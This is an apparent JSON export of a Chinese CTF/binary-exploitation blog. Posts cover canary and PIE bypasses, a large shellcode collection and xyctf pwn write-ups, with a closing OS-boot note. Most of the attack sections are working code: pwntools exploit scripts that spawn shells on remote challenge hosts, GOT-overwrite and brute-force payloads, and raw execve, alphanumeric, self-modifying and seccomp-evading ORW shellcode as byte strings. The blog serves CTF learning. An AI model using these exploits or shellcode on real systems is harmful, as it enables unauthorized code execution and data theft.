[{"title":"Canary的绕过","url":"/2025/04/05/Canary%E7%9A%84%E7%BB%95%E8%BF%87/","content":"写了这么久的题了，但是看到题还是一头雾水，完全在瞎碰，写个小总结，系统整理整理吧\n从保护开始\n1. Canary1.1 原理Canary就是在栈底放一个随机数，如果缓冲区变量溢出，那么这个随机数也会被篡改，当函数结束的时候会对这个随机数检查，如果发现这个随机数变了，就会执行_stack_chk_fail函数终止程序\n从汇编角度看：函数序言会向保存调用函数的栈底指针，然后设置被调用函数自身的栈底指针，最后分配栈空间，这3条汇编指令标志着一个经典的函数序言\n\n 比如buuctf中的bjdctf_2020_babyrop2，有开启Canary保护，就存在这样的代码\n mov     rbp, rspsub     rsp, 20hmov     rax, fs:28h\n但是Canary的非即时检测就留下了一定的操作空间：\n只要可以让Canary在函数未结束前泄露出来，构造payload时在它本应在的位置写上Canary就可以了\n所以问题就变为了如何泄露出来Canary，了解一下Canary随机值的特点\n（或者修改指向_stack_chk_fail的地址，让函数走向后门函数）\n\n一般Canary会在ebp-0x8处存储，\n\n其最低位设置为\\x00\n\n 这里本意时为了保证字符串可以被\\x00截断，从而保护其它字节信息\n\n\n\n1.2绕过思路1.2.1 覆盖截断获取随机值先填充缓冲区变量到Canary的最低字节，然后获取泄露的Canary，最后根据Canary的值填充rbp-0x8的位置，此后调用函数栈指针可以随意覆盖\n假设有一个题目这样布局\nchar buf[24]; // [rsp+0h] [rbp-20h] BYREFunsigned __int64 v2; // [rsp+18h] [rbp-8h]\n\n可以这样覆盖并泄露\noff_set = b&#x27;A&#x27;*(0x20-0x8)p.sendline(off_set)result = p.recvuntil(b&#x27;a&#x27;*(0x20-0x8)+b&#x27;\\n&#x27;)canary = u64(b&#x27;\\x00&#x27;+p.recv(7))\n\n1.2.2 格式化字符串直接泄露格式化字符串可以完成任意位置读写操作，所以泄露Canary值也是很轻松的\n以上面的例子来看\n假设测试得到我们输入的内容在栈中第6个位置，并且栈顶到Canary的距离为0x18(0x20-0x8)\n而一个不带长度的格式化字符会输出8&#x2F;4个字节大小的数据，0x18/0x8=3,所以应该在第6+3=9位置处\npayload如下：\npayload = b&#x27;%9$x&#x27;p.sendline(payload)canary = int(p.recvuntil(&#x27;\\n&#x27;)[:-1],16)\n\n1.2.3 逐字节爆破绕过Canary\n适用于有通过fork()函数创建的子进程的程序\n\n某些题目中存在fork()函数，且程序开启了Canary函数，当程序进入到子进程的时候，其Canary的值和父进程中Canary的值一样（因为fork函数为拷贝父进程的内存），一次你在一定体哦阿健下我们可以将Canary爆破出来\n需要的条件有：\n\n程序中存在栈溢出的漏洞\n可以覆盖到Canary的位置\n\n\n对于32位程序，只需要对3字节进行爆破，爆破方式是先利用栈溢出复写次低字节，如果出错的化会报错并且重启子进程，获得正确的次低节点就不会报错，获取正确此地节点之后依次爆破次高字节和高字节\n\n例程：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;  #include &lt;sys/wait.h&gt; void getshell(void)&#123;    system(&quot;/bin/sh&quot;);&#125; void init(void)&#123;    setbuf(stdin, 0);    setbuf(stdout, 0);    setbuf(stderr, 0);&#125; void vuln(void)&#123;    char buf[100];    memset(buf, 0, sizeof(buf));    read(0, buf, 0x200);    printf(&quot;%s\\n&quot;, buf);&#125;int main(void)&#123;    init();    while (1)    &#123;        printf(&quot;Hello Hacker!\\n&quot;);        if (fork()) //father        &#123;            wait(NULL);        &#125;        else //child        &#123;            vuln();            exit(0);        &#125;    &#125;     return 0;&#125;\n\ngcc pwn.c -no-pie -m32 -fstack-protector -z noexecstack -o pwn编译\npayload构造\ncanary = b&#x27;\\x00&#x27;for i in range(3):    for j in range(0,256):        payload = b&#x27;a&#x27;*(0x70-0xC)+canary+p8(j)        p.send(payload)        # time.sleep(0.1)        res = p.recv()        if (b&#x27;stack smashing detected&#x27; not in res):            print(f&#x27;the &#123;i&#125; is &#123;hex(j)&#125;&#x27;)            canary +=p8(j)            break    assert(len(canary) == i+2)log.info(&#x27;Canary；&#x27;+hex(u32((canary))))\n\n1.2.4 SSP泄露Canary\n使用与Flag存储于内存空间中的情况\n\nSSP全称为Stack Smashing Protect，这种方法可以读取内存中的值，当flag在内存中储存时，就可以用这个方法读取flag\n直接看这篇文章叭\n1.2.5 劫持_stack_chk_fail函数如果Canary不对，程序会转到stack_chk_fail函数执行，而这个函数是一个普通的延迟绑定函数，可以通过修改GOT表来劫持这个函数\n例程：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;void getshell(void)&#123;    system(&quot;/bin/sh&quot;);&#125;int main(int argc, char *argv[])&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);     char buf[100];    read(0, buf, 200);#栈溢出    printf(buf);    return 0;&#125;\n\n gcc pwn.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o pwn编译\n\n\n劫持函数要修改GOT表，所以关闭RELRO\n调用getshell函数，关闭pie\n\n\n我们直到GOT表中存的是函数的实际地址，如果把_stack_chk_fail函数的got表地址替换为getshell的地址，在canary出错的情况下，调用_stack_chk_fail时就会直接获取到shell\n直接用fmtstr_payload就行\n_stack_chk_fail_got = elf.got[&#x27;_stack_chk_fail&#x27;]backdoor = elf.sym[&#x27;getshell&#x27;]payload = fmtstr_payload(10,&#123;stack_chk_fail_got:backdoor&#125;)payload = payload.ljust(0x70,b&#x27;a&#x27;)p.send(payload)\n\n","categories":["summary"],"tags":["bypass","canary"]},{"title":"PIE绕过","url":"/2025/04/05/PIE%E7%BB%95%E8%BF%87/","content":"1，PIE介绍\nPIE全称是position-independent  executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。\n\n简单来说，在开启PIE之后，你不能再查找到代码段的绝对地址了，只能看到一个地址的后四位数字。\n这个地址并不是程序实际运行地址，而是于程序加载基址之间的偏移量。如果没有开启pie保护，程序的加载基址默认是0x400000，现在开启了PIE之后，每次运行程序的加载基址都是不同的\n程序的实际运行地址=程序加载基址+程序偏移地址\n注意：开启pie保护之后pwngdb调试的时候不能下断点，需要通过b *$rebase(offset)这种方式下断点，offset是ida中反汇编出来的程序地址偏移量\n2.绕过方式2.1 格式化字符串泄露真实地址\n无敌的格式化字符串又一次展现了它的神力\n\n如果一个程序中存在格式化字符串漏洞。我们就可以配合格式化字符串漏洞将程序某个函数的真实地址泄露出来\n直接写个exp:\np.sendline(b&#x27;aaaa%12$p&#x27;)p.recvuntil(b&#x27;aaaa&#x27;)base_addr = int(p.recv(14),16)-offset # offset为偏移地址，这个需要动态调试查看\n\n2.2 partial write\npartial  write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。\n\n省流： 不管程序加载基址怎么变化，偏移量和真实地址的最后三位都是一样的\n假设后门函数地址为0x09C5\nexp:\npayload = b&#x27;a&#x27;*0x30 + b&#x27;a&#x27;*0x8 + b&#x27;\\xC5\\x09&#x27; # 第二字节可能\\x19、\\x29...尝试一下\n\n","categories":["summary"],"tags":["bypass","PIE"]},{"title":"The Summary of Shellcode","url":"/2025/04/15/Shellcode/","content":"其实想要做的是代码注入总结篇\n基础shellcode的书写要做shellcode，认为有下面几点要解决：\n\n一般情况下需要相应内存块至少有可执行权限，如果没有的话看看有没有mprotect函数或者mmap函数，可以对指定内存区域申请权限\n需要知道写入地址，或者让寄存器指向写入的代码块\n\n直接pwntools生成/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) *//* push b&#x27;/bin///sh\\x00&#x27; */push 0x68mov rax, 0x732f2f2f6e69622fpush raxmov rdi, rsp/* push argument array [&#x27;sh\\x00&#x27;] *//* push b&#x27;sh\\x00&#x27; */push 0x1010101 ^ 0x6873xor dword ptr [rsp], 0x1010101xor esi, esi /* 0 */push rsi /* null terminate */push 8pop rsiadd rsi, rsppush rsi /* &#x27;sh\\x00&#x27; */mov rsi, rspxor edx, edx /* 0 *//* call execve() */push SYS_execve /* 0x3b */pop raxsyscall\n\n这里将/bin/sh直接压入栈中，然后利用rsp的偏移获取地址，直接生成shellcraft.sh()生成即可，不做过多介绍\n限制长度的shellcode（x86)xor rsi,rsipush rsimov rdi, 0x68732f2f6e69622fpush rdipush rsppop\t rdimov  al, 59cdqsyscall\n\n总长度为22（0x16)字节，实现的是execve(&#39;/bin/sh&#39;,&#123;&#39;sh&#39;&#125;,0)，构造出来的条件是这样的：\n\nrax:0x3b\nrdi:’&#x2F;bin&#x2F;sh’\nrsi:’sh’\nrdx:NULL\n\n但是注意，需要eax的高二位为0(一般没什么问题)\nbytes形式：\n\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n\n可见字符形式(AE64生成)：\n关于ae64,直接看这里就可以\nWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjrTYfi9h10t830T840T880T890t8A0T8B0T8CRAPZ0t80ZjBTYfi9O60t810T82RAPZ0T80ZH1vVHwzbinzzshWToxnQZP\n\n当然，出题人可能会通过一定的构造来要求更小字节的shellcode，主要就是对栈的理解（其实就是考察汇编功底）\n\n例如tgctf2025的shellcode，这里\n\n字符限制shellcode一般会出现过滤掉某些特定字符，这时候可以用自改变shellcode或者某些纯字母的shellcode\n纯字母（这里用的是V3rdant的shellcode）\n// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129/* from call rax */push raxpush raxpop rcx/* XOR pop rsi, pop rdi, syscall */push 0x41413030pop raxxor DWORD PTR [rcx+0x30], eax/* XOR /bin/sh */push 0x34303041pop raxxor DWORD PTR [rcx+0x34], eaxpush 0x41303041pop raxxor DWORD PTR [rcx+0x38], eax/* rdi = &amp;&#x27;/bin/sh&#x27; */push rcxpop raxxor al, 0x34push rax/* rdx = 0 */push 0x30pop raxxor al, 0x30push raxpop rdxpush rax/* rax = 59 (SYS_execve) */push 0x41pop raxxor al, 0x7a/* pop rsi, pop rdi*//* syscall */ .byte 0x6e.byte 0x6f.byte 0x4e.byte 0x44/* /bin/sh */.byte 0x6e.byte 0x52.byte 0x59.byte 0x5a.byte 0x6e.byte 0x43.byte 0x5a.byte 0x41\n\n这一段shellcode可以绕过\\x05\\x0f的过滤，但是注意这里需要由call rax启动\n自改变shellcode（这里用的whuctf2025中shell_for_shell）\nmov si, word ptr [r15 + 0x100]\t;r15的值+0x100，赋给si（rsi，16位模式)   add si, 0x101\t\t\t\t\t;再将si加上0x101   mov word ptr [r15 + 0x100], si\t;修改后的si存给r15+0x100的内存位置   /*这里是为了给后面syscall找个确定位置，顺便自加一*/   push 0x68\t\t\t\t\t\t;压入&quot;h&quot;   mov rax, 0x732f2f2f6e69622f\t\t;压入/bin///s到rax中   push rax\t\t\t\t\t\t;压入rax中的值   mov rdi, rsp\t\t\t\t\t;栈顶指针给rdi，作为路径字符串的地址，后面直接写入execve   push 0x1010101 ^ 0x6873\t\t\t;异或的值压栈，避免显式空字节   xor dword ptr [rsp], 0x1010101\t;异或解密栈顶4字节，得到&#x27;sh\\x00&#x27;   xor esi, esi /* 0 */   push rsi \t\t\t\t\t\t;作为字符串的\\x00   push 8\t\t\t\t\t\t\t;压入8，后面计算‘sh\\x00&#x27;字符串地址用   pop rsi\t\t\t\t\t\t\t;将8弹给rsi   add rsi, rsp\t\t\t\t\t;rsi=8+rsp，指向&#x27;sh\\x00&#x27;   push rsi \t\t\t\t\t\t;压入sh\\x00   mov rsi, rsp   xor edx, edx /* 0 */   /* call execve() */   push SYS_execve \t\t\t\t;等价于push 0x3b   pop rax\t\t\t\t\t\t\t;弹给rax\n\n注入时\npayload = (b&quot;\\x00\\xc0&quot;+asm(shellcode)).ljust(0x100-3, b&quot;\\x90&quot;)+b&quot;\\x0e\\x04&quot;\n\n详细解释见这里的自改变shellcode\norw自动生成\npwntool里有自己的orw生成，但是字节比较长，一般情况下都不太合适,仅作参考\n这里是buuctf第45题pwnable_orw题解中摘取的\nbss = 0x804A060shellcode = shellcraft.open(&#x27;flag&#x27;)shellcode+=shellcraft.read(&#x27;eax&#x27;,bss+100,100)shellcode+=shellcraft.write(1,bss+100,100)payload = asm(shellcode)\n\n长度为0x36字节\n短字节\n所以这里一般使用另一种总计0x28字节，要求:\n\nrsp指向的地址必须可用\n存在NULL字符（不存在\\x00导致截断）\n不可指定地址\n\n// rdx为写入数量mov rdx, 0x200push 0x67616c66mov rdi,rspxor esi,esi  #如果本来rsi=0，可以删掉这句mov eax,2syscallmov edi,eaxmov rsi,rspxor eax,eaxsyscallxor edi,2  mov eax,edisyscall  \n\nbytes:\n\\x48\\xc7\\xc2\\x00\\x02\\x00\\x00\\x68\\x66\\x6c\\x61\\x67\\x48\\x89\\xe7\\x31\\xf6\\xb8\\x02\\x00\\x00\\x00\\x0f\\x05\\x89\\xc7\\x48\\x89\\xe6\\x31\\xc0\\x0f\\x05\\x83\\xf7\\x02\\x89\\xf8\\x0f\\x05\n\n可指定地址\nshellcode = &quot;&quot;&quot;xor rdx,rdxmov dh, 0x2mov rdi,&#123;&#125;xor esi,esi  mov eax,2syscallmov rsi,rdimov edi,eaxxor eax,eaxsyscallxor edi,2mov eax,edisyscall&quot;&quot;&quot;.format(hex(target_addr + 0xb0))\n\n长度比0x90大\n书写更短的shellcode前面在基础shellcode的书写中已经说过很多了，这里主要提几个tip\n使用残留寄存器依旧是用tgctf2025的shellcode举例，动调发现寄存器除了rdi外全部清空，且限制0x12字节\n但是可以发现我们写入的指令最后被rdi指向，所以可以构造出合适的短shellcode\nshellcode = asm(&#x27;&#x27;&#x27;mov rdi,0xaadd rax,0x3bsyscall&#x27;&#x27;&#x27;)payload = shellcode+b&#x27;/bin/sh\\x00&#x27;\n\n特殊指令的使用\ncwd系列:\n\nCWD: AX符号位拓展到DX\n\nCDQ: EAX符号位拓展到EDX⭐\n\nCQO：RAX符号位拓展到RDX\n\nCBW: AL符号位拓展到DX\n\n\n\n\n寄存器复用书写受限制的shellcode字符限制一般是坏字符（\\x00),syscall过滤（\\x05\\x0f),可见字符\n可见字符前面已经说过了，利用alpha3和ae64进行编码，这边优劣如下\n\n\n\n\nae64\nalpha3\n\n\n\nx32位编码为可见字符\n❌\n✔\n\n\nx64位编码位可见字符\n✔\n✔\n\n\n原shellcode是否可以包含零字节\n✔\n❌\n\n\n基址寄存器是否可以包含偏移量\n✔\n❌\n\n\nsyscall过滤\n其中一种方法上面已经介绍过了，使用自改变shellcode。如果可操作空间够大的话，还可以尝试read重新读入shellcode\n具体过程就是：布置栈帧，调用read-&gt;利用read将shellcode读入指定地点-&gt;实现getshell\n依旧用whuctf2025的shell_for_shell举例，这里可见powchan的exp:\nshellcode = &quot;&quot;&quot;\tmov rbp, 0x404500    mov rsp, rbp    lea r15, [rip+0xe00]    sub r15, 0xe16    mov rdi, r15    mov rsi, 0x1000    mov rdx, 0x7    mov rax, 0x401070    call rax    mov rsi, r15    add rsi, 0x86    mov rdi, 0    mov rdx, 0x100    mov rax, 0x401050    call rax    /* push syscall number */    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push b&#x27;sh\\x00&#x27; */    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    /* call execve() */    push SYS_execve /* 0x3b */    pop rax    &quot;&quot;&quot;payload = b&quot;\\x00\\xc0&quot;+asm(shellcode)print(payload)io.send(payload)pause()io.send(asm(&quot;syscall&quot;))io.interactive()\n\n坏字符\n坏字符过滤的话可以直接去这里找不含\\x00的shellcode\n注意，这里的坏字符过滤可能是“”无心“”过滤掉的，例如strcpy遇见‘\\x00’就结束了，所以我们需要特定的shellcode\nxor ecx, ecxmul ecxpush ecxpush 0x68732f2fpush 0x6e69622fmov ebx, espmov al, 11int 0x80\n\nxor    rsi, rsipush   rsimov    rdi, 0x68732f2f6e69622fpush   rdipush   rsppop    rdimov    al, 0x3bcdq    syscall\n\n共22字节数（其实和上面最短shellcode一样的）\nb&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;\n\nb&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;\n\n特定位置限制这里有几个思路\n\n利用read函数再次读入，且将读入地址写为合适地址，这种适合给定的shellcode长度比较短\nssize_t read(int fd, void *buf, size_t count)\n\n\n\n参数\n对应寄存器\n作用\n\n\n\nfd\nrdi\n0表示从用户输入的值中读取\n\n\nbuf\nrsi\n输入到的地址\n\n\ncount\nrdx\n输入的长度\n\n\n\n利用mprotect重新为特定地址申请权限\nint mprotect(void *addr, size_t len, int prot)\n\n\n\n参数\n对应寄存器\n作用\n\n\n\naddr\nrdi\n内存起始地址\n\n\nlen\nrsi\n处理的长度\n\n\nproc\nrdx\n保护（1为r,2为w,4为x)\n\n\n\n利用mmap类函数申请开辟特定权限的空间\nvoid *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset)\n\n\n\n参数\n对应寄存器\n作用\n\n\n\nstart\nrdi\n开始地址，0表示系统指定\n\n\nlength\nrsi\n映射区长度，不足一页按照一页来处理\n\n\nprot\nrdx\n保护标志，同上\n\n\nflags\nr10\n映射对象的类型，一般设置22\n\n\nfd\nr8\n文件描述符，设置-1就可以\n\n\noffset\nr9\n被映射对象内容的起点\n\n\n\n\nseccomp绕过level1 开放open,read,writepush   0x67616c66mov    rdi, rspxor    esi, esipush   0x2pop    raxsyscall mov    rdi, raxmov    rsi, rspmov    edx, 0x100xor    eax, eaxsyscall mov    edi, 0x1mov    rsi, rsppush   0x1pop    raxsyscall\n\nlevel2 关闭openmov rax,0x0067616c662fpush raxmov rsi,rspxor rdx,rdxmov rax,257syscallxor rdi,rdiinc rdimov rsi,raxxor rdx,rdxmov r10,0x100 # 读取文件的长度,不够就加mov rax,40syscall\n\nb&#x27;H\\xb8/flag\\x00\\x00\\x00PH\\x89\\xe6H1\\xd2H\\xc7\\xc0\\x01\\x01\\x00\\x00\\x0f\\x05H1\\xffH\\xff\\xc7H\\x89\\xc6H1\\xd2I\\xc7\\xc2\\x00\\x01\\x00\\x00H\\xc7\\xc0(\\x00\\x00\\x00\\x0f\\x05&#x27;\n\nlevel3 openat readv writevmov rax,0x0067616c662fpush raxmov rsi,rspxor rdx,rdxmov rax,257syscallmov rdi,raxpush 0x100 # 读入大小由这个控制mov rbx,rspsub rbx,0x108 # 为读入大小加8push rbxmov rsi,rspmov rdx,1mov rax,19syscallmov rdi,1mov rsi,rspmov rdx,1mov rax,20syscall\n\nb&#x27;H\\xb8/flag\\x00\\x00\\x00PH\\x89\\xe6H1\\xd2H\\xc7\\xc0\\x01\\x01\\x00\\x00\\x0f\\x05H\\x89\\xc7h\\x00\\x01\\x00\\x00H\\x89\\xe3H\\x81\\xeb\\x08\\x01\\x00\\x00SH\\x89\\xe6H\\xc7\\xc2\\x01\\x00\\x00\\x00H\\xc7\\xc0\\x13\\x00\\x00\\x00\\x0f\\x05H\\xc7\\xc7\\x01\\x00\\x00\\x00H\\x89\\xe6H\\xc7\\xc2\\x01\\x00\\x00\\x00H\\xc7\\xc0\\x14\\x00\\x00\\x00\\x0f\\x05&#x27;\n\nlevel3.5 openat2 read writemov rax, 0x67616c66 # 路径push raxxor rdi, rdisub rdi, 100mov rsi, rsppush 0push 0push 0mov rdx, rspmov r10, 0x18push SYS_openat2 # pwntools预定义的系统调用号,也可以手动查pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall\n\nb&#x27;H\\xc7\\xc0flagPH1\\xffH\\x83\\xefdH\\x89\\xe6j\\x00j\\x00j\\x00H\\x89\\xe2I\\xc7\\xc2\\x18\\x00\\x00\\x00h\\xb5\\x01\\x00\\x00X\\x0f\\x05H\\x89\\xc7H\\x89\\xe6\\xba\\x00\\x01\\x00\\x001\\xc0\\x0f\\x05\\xbf\\x01\\x00\\x00\\x00H\\x89\\xe6j\\x01X\\x0f\\x05&#x27;\n\nTips\n有些题目对shellcode的检查可能用到了strlen或别的什么str类型函数，这个时候可以直接在shellcode前加一个\\x00起手的指令，绕过判断\n\n在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址\n\n在32位程序中，还可以通过call指令获取将运行地址压入栈中\n在64位地址中，可以直接通过 lea rax, [rip] 来获取rip地址\n\n\n有些时候如果开启了PIE、ASLR保护，地址未知，可以尝试泄露fs寄存器中的值，可以见这篇\n\n\n","categories":["summary"],"tags":["shellcode"]},{"title":"xyctf-pwn","url":"/2025/04/11/xyctf/","content":"还在更新中，复现网站在这里\narknights栈迁移+read读\n先贴exp：\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()host = &#x27;gz.imxbt.cn&#x27;post = 20998#p = process(&#x27;./pwn&#x27;)p = remote(host,post)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./pwn&#x27;)#gdb.attach(p)pop_rdi = 0x00000000004018e5leave = 0x0000000000401393sys = 0x000000000401130read = 0x0000000004018A8p.sendline(b&#x27; &#x27;)p.sendline(b&#x27;4&#x27;)p.sendline(b&#x27;1&#x27;)payload = b&#x27;a&#x27;*0x40+p64(elf.bss(0x408))+p64(read)pause()p.send(payload)pause()payload2 = b&#x27;/bin/sh\\x00&#x27;*0x8+p64(0)+p64(pop_rdi)+p64(elf.bss(0x400-0x20))+p64(sys)pause()p.send(payload2)pause()p.sendline(&#x27;exec 1&gt;&amp;0&#x27;)p.interactive()\n\n前面抽卡那里没什么问题，直接跳过\n\n这里可以看到read(0,s,0x60)这里存在栈溢出，溢出了0x20字节，并且执行system指令，那么我们的利用思路就很清晰了：\n覆写rbp为bss段地址-&gt;利用read函数将/bin/sh写入bss段(这里vmmap看过了，bss段可写)-&gt;通过pop rdi执行/bin/sh\npayload = b&#x27;a&#x27;*0x40+p64(elf.bss(0x408))+p64(read)\n\nelf.bss(offset)函数：返回值为int,为.bss段的地址，加上特定的offset。在这里就是返回到bss段+0x408的位置\n\n这里调试可以看到，我们将rbp覆盖为了bss段某个地址，接下来就是执行read相关的指令，且read将读入的内容存放在rbp-0x40处\npayload2 = b&#x27;/bin/sh\\x00&#x27;*0x8+p64(0)+p64(pop_rdi)+p64(elf.bss(0x400-0x20))+p64(sys)\n\n接下来因为调用的还是这个read(0,s,0x60)，所以先填充0x40字节的/bin/sh\\x00到bss段，接下来再次覆盖rbp为0，执行pop_rdi，弹出bss段+0x400-0x20处的内容\n官方ret2text解from pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()host = &#x27;gz.imxbt.cn&#x27;post = 20476p = process(&#x27;./pwn&#x27;)#p = remote(host,post)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./pwn&#x27;)gdb.attach(p)pop_rdi = 0x00000000004018e5count = 0x000000000405BCCsys = 0x0000000004018FC# sh p64(26739)payload = b&#x27;a&#x27;*0x48+p64(pop_rdi)+p64(count)+p64(sys)def ck(n):    p.recv()    p.sendline(b&#x27;3&#x27;)    p.recv()    p.sendline(str(n).encode())    p.sendline(b&#x27;\\n&#x27;)p.sendline(b&#x27;a&#x27;)ck(10000)ck(10000)ck(6739)p.recv()p.sendline(b&#x27;4&#x27;)p.recv()p.sendline(b&#x27;1&#x27;)pause()p.sendline(payload)pause()p.sendline(b&#x27;exec 1&gt;&amp;2&#x27;)p.interactive()\n\n\n这里跟进star()函数\n\n看到sum_count会根据抽卡次数加加\n那么我们可以通过合理控制sum_count的值，使之变成sh\n❯ python3Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; print(u64(b&#x27;sh&#x27;.ljust(8,b&#x27;\\x00&#x27;)))26739\n\n所以，后面就很简单了\nEZ3.0mips架构，但是简单栈溢出，甚至有gadget\n先贴exp：\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()host = &#x27;gz.imxbt.cn&#x27;post = 20860#p = process(&#x27;./pwn&#x27;)p = remote(host,post)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./pwn&#x27;)#gdb.attach(p)gadget = 0x0400A20binsh = 0x0411010door = 0x409c8sys  =0x0400B70payload = b&#x27;a&#x27;*32+b&#x27;a&#x27;*0x4+p32(gadget)+p32(0)+p32(sys)+p32(binsh)p.sendline(payload)p.interactive()\n\n\nida竟然也能逆这个，还是太强大了\n一眼栈溢出，左边还有个JustIsBackdoor\n\n源码一看，下面跟着就是gadget（不知道意思的话直接问问ai）\npayload就很好写了，以下略\n","categories":["wp"],"tags":["wp"]},{"title":"操作系统学习笔记01-从POST到Loader","url":"/2025/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E4%BB%8EPOST%E5%88%B0Loader/","content":"0xFF 前言很早就萌生了自己写一个操作系统的想法，但是碍于学校各种事情，总是没时间，终于迎来了暑假，尝试在这个暑假里写一写,或许会更新成一个系列（？,但愿吧\n这里是打算跟着吾爱上的这一系列博客进行操作，在这里记录一些笔记\n0x01 BIOS以及MBR0x01 00 操作系统的启动从我们按下电源键到最终启动的完成，大致是下图的一个流程，而这一小节主要是编写BIOS以及MBR，其作用是引导操作系统的启动\n    graph TD;\n    A[加电] --> B[POST: 硬件自检];\n    B --> C{BIOS/UEFI?};\n    C -->|BIOS| D[加载MBR的引导代码];\n    C -->|UEFI| E[读取ESP分区的.efi文件];\n    D --> F[GRUB Stage 1 → Stage 1.5 → Stage 2];\n    E --> G[执行EFI应用程序（如grubx64.efi）];\n    F --> H[加载内核（vmlinuz/ntoskrnl.exe）和initramfs];\n    G --> H;\n    H --> I[内核初始化: 驱动、内存管理、挂载根文件系统];\n    I --> J{Linux/Windows?};\n    J -->|Linux| K[Systemd启动（PID=1）];\n    J -->|Windows| L[启动smss.exe → winlogon.exe];\n    K --> M[并行启动服务单元（网络、日志等）];\n    L --> N[加载用户配置和桌面（Explorer.exe）];\n    M --> O[显示登录界面（GDM/LightDM）];\n    N --> P[用户登录桌面];\n    O --> Q[用户登录Shell或图形界面];\n    Q --> R[启动完成];\n    P --> R;\n\n0x01 01 BIOS全称为Base Input &amp; Output System，也就是基本输入输出系统\n但是我们知道，开机的时候并不存在页表，也就没有页映射这一说，所以只能通过物理地址来进行编程，这一利用物理地址的模式我们叫做实模式\n\n  \n    \n      tips\n\n    \n    \n      页表是操作系统维护的一种数据结构，用于存储虚拟页号到物理页号帧号的映射关系，每个进程都有自己的页表，由内存管理单元（MMU)在地址转换时使用\n页映射就是指页表将虚拟地址空间中的页面映射到物理内存中的页帧的过程\n大概是这样一个过程（有点像哈希表）\n虚拟地址 -&gt; [虚拟页号 | 页内偏移]             |             | 通过页表查找             ↓物理地址 -&gt; [物理页帧号 | 页内偏移]\n    \n  \n\n关于实模式，以8086为例，列举一些\n\nBIOS入口在0xFFFF0-0xFFFFF,执行了一个jmp指令，跳转到真正的BIOS地址\n中断向量表在0x00000到0x003FF\nMBR加载地址在0x7C00到0x7DFF\n\n0x01 02 BIOSBIOS的功能是检测初始化硬件，存放在内存ROM区，但现在存储在主板上的一个或多个芯片中\n我们可以在上面的流程图中看到某个叫做POST（Power-On Self-Test的过程，主要是检查CPU、内存、主板、硬盘、显卡等设备。POST结束后系统BIOS调用其它设备的BIOS对各个设备进行检测和初始化。如果没有什么问题，就将执行启动程序\n\n  \n    \n      tips\n\n    \n    \n      ROM和RAM\n\nROM(只读存储器)：断电后数据不会丢失，通常不可写入（现代类型允许有限次擦写），读取速度快但写入速度慢\nRAM（随机存取存储器）：断电后数据丢失，支持高速频繁读写，比ROM和硬盘快的多\n\n一般情况下，CPU从ROM加载固件（例如BIOS），再加载操作系统到RAM\n\n    \n  \n\n0x01 03 MBR 